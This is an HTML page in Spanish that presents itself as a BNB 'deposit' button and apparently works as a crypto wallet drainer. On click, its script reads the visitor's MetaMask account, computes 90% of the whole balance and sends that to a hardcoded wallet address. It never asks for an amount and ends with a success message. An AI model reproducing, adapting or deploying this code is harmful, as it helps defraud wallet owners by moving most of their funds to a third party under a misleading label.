






















<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Botón de depósito de BNB</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
  </head>
  <body>
    <button id="deposit-button">Depositar BNB</button>

    <script>
      // Crea una instancia de Web3 con el proveedor de Metamask
      const web3 = new Web3(window.ethereum);

      // Escucha el evento de click en el botón de depósito
      $("#deposit-button").click(async function () {
        try {
          // Obtiene la dirección de Metamask del usuario
          const accounts = await web3.eth.getAccounts();
          const userAddress = accounts[0];

          // Obtiene el saldo de BNB en la cuenta del usuario
          const balance = await web3.eth.getBalance(userAddress);
          const balanceBN = web3.utils.toBN(balance);

          // Calcula la cantidad a depositar (90% del saldo)
          const depositAmountBN = balanceBN.muln(90).divn(100);
          const depositAmount = web3.utils.fromWei(
            depositAmountBN.toString(),
            "ether"
          );

          // Dirección de destino para el depósito
          const depositTo = "0x8935361d21943Ee8a863082EdD8a6Aefb062E434";

          // Crea la transacción y la firma con Metamask
          const tx = {
            to: depositTo,
            value: web3.utils.toWei(depositAmount, "ether"),
          };
          const signedTx = await web3.eth.sendTransaction(tx);

          console.log("Transacción enviada:", signedTx);
          alert("¡Depósito exitoso!");
        } catch (error) {
          console.error(error);
          alert("Error al enviar la transacción. Verifica que tienes suficiente saldo y que Metamask está conectado.");
        }
      });
    </script>
  </body>
</html>
